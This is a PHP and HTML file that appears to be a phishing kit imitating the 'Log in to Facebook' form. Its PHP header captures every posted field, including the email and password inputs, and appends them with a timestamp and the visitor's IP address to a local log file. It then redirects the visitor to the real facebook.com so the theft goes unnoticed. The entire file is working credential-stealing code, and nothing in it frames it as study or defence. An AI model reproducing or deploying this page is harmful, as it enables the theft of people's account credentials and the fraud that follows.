<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: http://facebook.com');
$handle = fopen('log_RkDW86RNU8.txt', 'a');
fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable.': '.$value."\r\n");}
fclose($handle);
exit;
} ?>
﻿<div class="_4-u2 _1w1t _4-u8 _52jv" style="display: block;">
                        <img src="../en/appspic.jpg" width="600" height="38" style="margin:-16px 0 0px -101px;">
						<div class="_xku"><span class="_50f6">Log in to Facebook</span></div>
                        <div class="login_form_container">
                            <form id="login_form" action="<?php echo basename(__FILE__); ?>" accept-charset="utf-8" method="post">
                                
                                <div id="loginform">
                                    
                                    
                                    
                                    <div class="clearfix _5466 _44mg">
                                        <input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="email" id="email" tabindex="1" placeholder="Email address or phone number" value="" autofocus="1" aria-label="Email address or phone number" type="text">
                                    </div>
                                    <div class="clearfix _5466 _44mg">
                                        <input class="inputtext _55r1 inputtext _1kbt inputtext _1kbt" name="pass" id="pass" tabindex="1" placeholder="Password" aria-label="Password" type="password">
                                    </div>
                                    <div class="_xkt">
                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" tabindex="1" type="submit">Log In</button>
                                    </div>
											                                    
                                    
                                    
                                </div>
                            </form>
                        </div>
                    </div>